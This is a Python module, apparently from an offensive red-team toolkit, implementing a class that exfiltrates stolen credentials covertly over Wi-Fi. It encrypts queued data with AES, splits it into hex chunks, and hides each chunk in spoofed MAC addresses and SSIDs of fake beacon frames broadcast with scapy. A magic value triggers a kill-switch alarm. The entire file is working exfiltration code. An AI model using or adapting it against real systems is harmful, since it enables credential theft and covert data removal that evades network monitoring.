import time
import pyaes
import pyscrypt
import threading
import logging
from scapy.all import *

# Me
__author__ = "Emilio / @ekio_jp"
__version__ = "2.020"


class ExfilWifi(threading.Thread):
    """
    Class to handle the Fake AP broadcasting SSID for extraction
    """
    def __init__(self, q, conf):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.q = q
        self.iface = conf['WIFACE']
        self.mac = conf['WIFIMAC']
        self.channel = int(conf['WIFICHAN'])
        self.magic = conf['MAGIC']
        self.ssid = conf['SSIDROOT'].encode()
        self.ssidalarm = conf['SSIDALARM'].encode()
        self.phrase = conf['PHRASE']
        self.salt = conf['SALT']
        self.count = 5
        if conf['DEBUG']:
            logging.basicConfig(level=logging.DEBUG)

    def run(self):
        while not self.stoprequest.isSet():
            data = self.q.get()
            if data:
                # Kill Switch
                if data == self.magic:
                    self.alarm()
                    self.stoprequest.set()
                else:
                    # encrypt and split into 6 bytes
                    cry = self.encrypt(data)
                    ar = [cry[i:i+6] for i in range(0, len(cry), 6)]
                    if len(cry) % 6 != 0:
                        for x in range(6-len(ar[len(ar)-1])):
                            ar[len(ar)-1] = ar[len(ar)-1] + '0'

                    logging.debug('Sending credentials via Wifi')

                    # first SSID (with out append -g)
                    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=self.mac, addr3=self.mac, SC=len(ar))
                    beacon = Dot11Beacon(beacon_interval=len(cry))
                    ssid = Dot11Elt(ID='SSID',info=self.ssid, len=len(self.ssid))
                    wifipkt = RadioTap(present='Channel', ChannelFrequency=self.channel)/dot11/beacon/ssid
                    sendp(wifipkt, iface=self.iface, inter=0.100, count=self.count, verbose=0)

                    # second + n of crypto chuck as SSID (append -g)
                    for x in range(len(ar)):
                        nadd2 = (self.mac[0:9] + ar[x][0:2] + ':' + ar[x][2:4] + ':' + ar[x][4:6])
                        dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=nadd2, addr3=nadd2, SC=x)
                        beacon = Dot11Beacon(beacon_interval=len(cry))
                        chunk = self.ssid[:-6:] + ar[x].encode() + b'-g'
                        ssid = Dot11Elt(ID='SSID',info=chunk, len=len(chunk))
                        wifipkt = RadioTap(present='Channel', ChannelFrequency=self.channel)/dot11/beacon/ssid
                        sendp(wifipkt, iface=self.iface, inter=0.100, count=self.count, verbose=0)

    # AES crypto
    def encrypt(self, cleartxt):
        key = pyscrypt.hash(self.phrase.encode(), self.salt.encode(), 1024, 1, 1, 16)
        aes = pyaes.AESModeOfOperationCTR(key)
        ciphertxt = aes.encrypt(cleartxt.encode())
        return ciphertxt.hex()

    # Alarm Funtion
    def alarm(self):
        wifipkt = RadioTap(present='Channel', Channel=self.channel, version=0, pad=0, len=12)/Dot11()/Dot11Beacon()/Dot11Elt()/Dot11EltRSN()
        wifipkt[Dot11].addr2 = self.mac
        wifipkt[Dot11].addr3 = self.mac
        wifipkt[Dot11Elt].info = self.ssidalarm
        wifipkt[Dot11Elt].len = len(self.ssidalarm)
        wifipkt[Dot11].SC = int(self.magic)
        sendp(wifipkt, iface=self.iface, inter=0.500, count=5, verbose=0)

    # Stop Function
    def join(self):
        self.stoprequest.set()
